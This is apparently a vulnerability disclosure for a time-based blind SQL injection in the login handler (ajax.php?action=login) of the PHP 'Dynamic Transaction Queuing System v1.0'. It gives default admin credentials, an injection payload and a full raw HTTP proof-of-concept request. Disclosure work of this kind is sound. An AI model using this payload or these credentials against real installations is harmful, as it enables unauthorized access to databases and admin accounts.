# Dynamic Transaction Queuing System v1.0 by oretnom23 has SQL injection

BUG_Author: ctg503 team 

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14479/dynamic-transaction-queuing-system-using-phpmysql-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File:  /queuing/admin/ajax.php?action=login

Vulnerability location: /queuing/admin/ajax.php?action=login, name

dbname =queuing_db

[+] Payload: username=admin' and sleep(5)--+&password=admin // Leak place ---> name

```sql
POST /queuing/admin/ajax.php?action=login HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=t4551shae3529036q2g0j8luub
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

username=admin' and sleep(5)--+&password=admin
```

![image](https://user-images.githubusercontent.com/54017627/200101180-647f48a9-e83f-4678-ac69-849fb4dd66fa.png)
